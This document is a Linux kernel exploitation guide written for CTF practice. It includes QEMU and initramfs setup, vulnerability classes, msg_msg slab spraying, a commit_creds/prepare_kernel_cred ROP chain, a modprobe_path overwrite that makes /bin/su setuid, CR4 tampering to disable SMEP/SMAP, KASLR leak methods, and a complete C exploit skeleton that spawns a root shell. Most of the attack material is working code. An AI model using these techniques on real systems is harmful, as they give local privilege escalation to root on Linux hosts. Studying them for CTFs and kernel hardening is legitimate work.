# Kernel Pwn (Kernel Pwn)

## Prepare environment

Typical core question package:

```text
kernel/
├── bzImage # Compressed kernel image
├── vmlinux # Uncompressed kernel (signed, for gdb)
├── initramfs.cpio.gz / rootfs.img
├── vuln.ko # Vulnerability driver
├── run.sh # qemu startup script
└── (.config) # Compile configuration, optional
```

### Disassemble initramfs and change init script

```bash
mkdir initramfs && cd initramfs
zcat ../initramfs.cpio.gz | cpio -idm
# or newc format:
# cpio -idm < ../initramfs.cpio

# Change init to get root (for CTF learning, real questions usually use setuid 1000)
sed -i 's|setuidgid 1000|setuidgid 0|g' init
# Or comment out the user switch line

# repackage
find . | cpio -o --format=newc | gzip > ../initramfs.cpio.gz
cd ..
```

### Extract vmlinux (if only bzImage is given)

```bash
# Use the extract-vmlinux script (kernel source code scripts/)
/usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
```

### QEMU startup parameter template

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 256M \
    -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -cpu kvm64,+smep,+smap \
    -append "console=ttyS0 nokaslr quiet oops=panic panic=1" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    -s    # Open gdb port 1234
```

Protection corresponding to key parameters:

| Parameters | Meaning | Impact Exploitation |
|------|------|---------|
| `+smep` | Kernel mode cannot execute user mode code | ROP must be used and cannot jump to user mode shellcode |
| `+smap` | Kernel state cannot access user state data | The rop chain cannot be placed in user state, it must be placed in kernel state (heap spray/msgsnd) |
| `+pku` | Protection Keys | Similar to SMAP |
| `nokaslr` | Disable KASLR | Fixed function address |
| `kaslr` | Enable KASLR | Must leak |
| `pti=on` | KPTI (Meltdown fix) | User mode return requires swapgs_restore_regs_and_return_to_usermode |

### debug

```bash
# Terminal 1
./run.sh   # with -s

# Terminal 2
gdb vmlinux
(gdb) target remote :1234
(gdb) b vulnerable_ioctl
(gdb) c
```

GEF recommends using the fork maintained by bata24, which has special pretty-printing for kernel structures.

## Vulnerability type diversion

| Vulnerabilities | Typical Sources | Exploit Baselines |
|------|---------|---------|
| Kernel stack overflow | copy_from_user length controllable | Stack canary + KASLR → ROP |
| Kernel heap overflow | kmalloc slab out-of-bounds write | slab spray + overwrite adjacent objects |
| UAF | refcount error / double free | Reapply for the same slab → Control release object |
| Integer overflow | size calculation overflow → small allocation, large copy | Actual overflow, same as above |
| TOCTOU | User mode pointer secondary dereference | userfaultfd / FUSE drag time |
| race | dual threads simultaneously ioctl | card timing window |
| Read and write at will | Already the ultimate primitive | Change cred / modprobe_path directly |

## slab spray (heap pwn core)

Spray kernel objects of controllable size onto the vulnerable slab to cover the target object.

| slab size | spray object | advantages |
|-----------|---------|------|
| kmalloc-64 / 96 | `seq_operations` | There is a function pointer, covering and controlling IP |
| kmalloc-1024 | `tty_struct` | has ops pointer and beautiful structure |
| kmalloc-4096 | `pipe_buffer` | The mainstay of the modern version, still valid in 6.x |
| Any size | `msg_msg` | The size is controllable (8 - 4096+), sysv msgsnd controls the data |
| kmalloc-128 | `user_key_payload` | keyctl series interface |

### msg_msg Spray example

```c
// User mode trigger
int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

struct {
    long mtype;
    char mtext[0x80 - 0x30];  // Add msg_msg header 0x30 = kmalloc-128
} msg = { .mtype = 0x1337 };
memset(msg.mtext, 'A', sizeof(msg.mtext));

msgsnd(msqid, &msg, sizeof(msg.mtext), 0);   // squirt to kmalloc-128
// ...trigger vulnerability coverage
msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // Read back to see if it has been changed → leak
```

## Privilege escalation path

### 1. commit_creds(prepare_kernel_cred(0)) ROP

Classic and versatile. Prerequisite: Ability to control RIP (stack overflow/vtable hijacking).

```c
// User mode ROP chain
uint64_t rop[] = {
    pop_rdi,                          // pop rdi; ret
    0,                                // arg: 0
    prepare_kernel_cred,              // → return root cred to rax
    pop_rdi,                          // pop rdi; ret
    /* Placeholder, the following mov will cover */ 0,
    /* mov rdi, rax; ... ; ret */ 0, // turn rax→rdi (some require special gadget)
    commit_creds,                     // Set current process cred = root
    swapgs_restore_regs_and_return_to_usermode + 22,  // skip push sequence
    0, 0,                             // rax, rdi placeholder
    user_rip,                         // User mode return function (save cs/ss)
    user_cs, user_rflags, user_rsp, user_ss,
};
```

**Key gadget** (find it in ROPgadget in vmlinux):

```bash
ROPgadget --binary vmlinux --only "pop|ret" | grep 'pop rdi'
ROPgadget --binary vmlinux --only "mov|ret" | grep 'mov rdi, rax'
```

cs/ss/rflags/rsp must be saved before returning to user mode:

```c
void save_state() {
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp));
}
void shell() { system("/bin/sh"); }
```

### 2. Modprobe_path changes to /tmp/x (easiest)

```text
principle:
  - Kernel global variable modprobe_path defaults to "/sbin/modprobe"
  - When execve a file that does not know magic, the kernel calls modprobe_path to execute as root
  - Change to "/tmp/x", write /tmp/x (chmod +x), trigger unknown magic execution
  
Applicable: There are arbitrary writing primitives, but they may not be able to ROP
```

```c
// 1. Prepare payload
system("echo -e '#!/bin/sh\nchmod +s /bin/su' > /tmp/x");
system("chmod +x /tmp/x");

// 2. Prepare trigger file
system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger");
system("chmod +x /tmp/trigger");

// 3. Vulnerability writing: change modprobe_path to "/tmp/x\x00"
arbitrary_write(modprobe_path_addr, "/tmp/x\x00");

// 4. Trigger
system("/tmp/trigger");
// Kernel root ran /tmp/x and did chmod +s /bin/su

// 5. Use setuid
system("/bin/su");
```

**modprobe_path address source**: symbols in vmlinux, or /proc/kallsyms (if kptr_restrict=0).

### 3. core_pattern hijack

```text
Similar idea: /proc/sys/kernel/core_pattern controls the coredump handler
Change to "|/tmp/x %P", called when the process crashes
Disadvantages: coredump needs to be triggered, more cumbersome than modprobe_path
```

### 4. Kernel ROP off SMEP/SMAP

If you just want to jump back to user mode shellcode (for learning purposes), you can ROP off the cr4 bit:

```c
// CR4: SMEP = bit 20, SMAP = bit 21
// After turning off SMEP+SMAP, jmp can only run in user mode shellcode.
uint64_t rop[] = {
    pop_rdi,
    0x6f0,                  // CR4 expected value (remove SMEP/SMAP bit)
    mov_cr4_rdi,            // "mov cr4, rdi; pop rbp; ret" etc.
    0,
    user_shellcode_addr,    // Skip over (this step will fail if SMEP is not turned off)
};
```

In fact, **real-life utilization basically does not take this path** - direct commit_creds ROP is shorter and more stable.

## KASLR leak channel

| Source | Restrictions | Remarks |
|------|------|------|
| /proc/kallsyms | `kptr_restrict=0` has the real address | CTF is always open |
| /sys/module/.../sections/.text | Same as above | Module base address |
| dmesg | `dmesg_restrict=0` can only be read | oops information leakage address |
| Kernel stack uninitialized reading | The vulnerability itself must be able to be read at will | Residual address |
| msg_msg + vulnerability leak | OOB read after injection | General |
| Bypass (Meltdown/Spectre) | KPTI fixed Meltdown | Not universal |
| SIDT/SGDT user mode instructions | Old kernels may leak | Modern ones are basically blocked |

```c
// Classic: read from /proc/kallsyms
FILE *f = fopen("/proc/kallsyms", "r");
char line[256];
unsigned long commit_creds = 0;
while (fgets(line, sizeof(line), f)) {
    if (strstr(line, " commit_creds")) {
        commit_creds = strtoul(line, NULL, 16);
        break;
    }
}
unsigned long kbase = commit_creds - 0xXXXXX;  // Offset to see vmlinux
```

## Complete exploit template (user mode + ioctl trigger + ROP privilege escalation + shell)

```c
// exploit.c — Kernel pwn generic skeleton
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

static unsigned long user_cs, user_ss, user_rflags, user_rsp;

static void save_state(void) {
    __asm__ volatile(
        "movq %%cs,   %0\n"
        "movq %%ss,   %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp,  %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :: "memory");
}

static void win(void) {
    if (getuid() == 0) {
        puts("[+] root!");
        system("/bin/sh");
    } else {
        puts("[-] not root");
    }
    exit(0);
}

// === KASLR base (directly write to leak or nokaslr first) ===
#define KBASE_DEFAULT  0xffffffff81000000UL
#define OFF_COMMIT_CREDS         0x0xxxxx
#define OFF_PREPARE_KERNEL_CRED  0x0xxxxx
#define OFF_POP_RDI              0x0xxxxx
#define OFF_MOV_RDI_RAX          0x0xxxxx
#define OFF_SWAPGS_RESTORE       0x0xxxxx

int main(void) {
    save_state();

    // 1. leak KASLR base (assuming /proc/kallsyms is readable here, or write a leak primitive yourself)
    unsigned long kbase = leak_kbase();

    unsigned long prepare_kernel_cred = kbase + OFF_PREPARE_KERNEL_CRED;
    unsigned long commit_creds        = kbase + OFF_COMMIT_CREDS;
    unsigned long pop_rdi             = kbase + OFF_POP_RDI;
    unsigned long mov_rdi_rax         = kbase + OFF_MOV_RDI_RAX;
    unsigned long swapgs_restore      = kbase + OFF_SWAPGS_RESTORE + 22;

    // 2. Construct ROP (on user stack or on sprayed fake stack)
    unsigned long *rop = mmap((void*)0x100000, 0x1000,
                              PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
    int i = 0;
    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = mov_rdi_rax;
    rop[i++] = commit_creds;
    rop[i++] = swapgs_restore;
    rop[i++] = 0;  // rax
    rop[i++] = 0;  // rdi
    rop[i++] = (unsigned long)win;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = (unsigned long)(rop + 100);  // Temporary user rsp, can refer to mmap height
    rop[i++] = user_ss;

    // 3. Trigger the vulnerability and let the kernel RIP jump to rop[0]
    int fd = open("/dev/vuln", O_RDWR);
    trigger(fd, rop);   // Topic related: ioctl/write/read

    return 0;
}
```

## Learning reference: CVE-2022-0185

```text
Vulnerability: Signed/unsigned confusion in legacy_parse_param length calculation in fs/fs_context.c
→ kmalloc heap buffer overflow, size is arbitrary, data is arbitrary

Why are good learning samples:
1. No root trigger required (unprivileged user namespace)
2. Overflow size fully controllable
3. Publicly available complete writeup + PoC
4. Integrated: user_ns utilization, msg_msg injection, post-UAF reoccupation, cross-cache utilization

Learning path:
1. Compiling the kernel with CONFIG_USER_NS=y
2. Running the original PoC of Crusaders of Rust: https://www.openwall.com/lists/oss-security/2022/01/18/7
3. See the official writeup of willsroot.io (version included in PortSwigger)
4. Manual rewrite: change msg_msg injection to pipe_buffer injection version (exercise different slab paths)
5. Added KASLR leak (the original version uses /proc/kallsyms, and the challenge version uses OOB read after disabling it)
```

The main technical points correspond to the chapters of this document:

- Vulnerability Type → "Kernel Heap Overflow"
- spray object → "msg_msg spray"
- Privilege escalation method → ​​"commit_creds ROP" or "modprobe_path"
- KASLR leak → "/proc/kallsyms" or "msg_msg + vulnerability leak"

## Notes

- **CONFIG_RANDOM_KSTACK_OFFSET / RANDOMIZE_KSTACK_OFFSET_DEFAULT** causes the kernel stack base address to be randomly offset by 0-1023 for each syscall, affecting all applications that rely on fixed stack offsets.
- **CONFIG_SLAB_FREELIST_RANDOM / HARDENED** randomizes the object allocation within the slab, the injection success rate decreases, and more spraying is required
- **CONFIG_STATIC_USERMODEHELPER** Set modprobe_path to read-only `static_usermodehelper_path`, modprobe attack fails
- **KPTI** separates user mode/kernel mode page tables. To return to user mode, you must use the `swapgs_restore_regs_and_return_to_usermode` trampoline. Swapgs+iretq cannot be used directly.
- **FG-KASLR** (function-granular KASLR) randomizes function levels and requires leaking multiple symbols to invert each function offset
- **CET / IBT** (Intel control flow enforcement) makes indirect jumps must fall in the ENDBR instruction, and some gadgets are invalid.
- **Do not adjust the printk output test in the kernel** - Serial port IO will change the timing and destroy the race; use a magic register value (rcx=0xdeadbeef) + gdb watch to debug
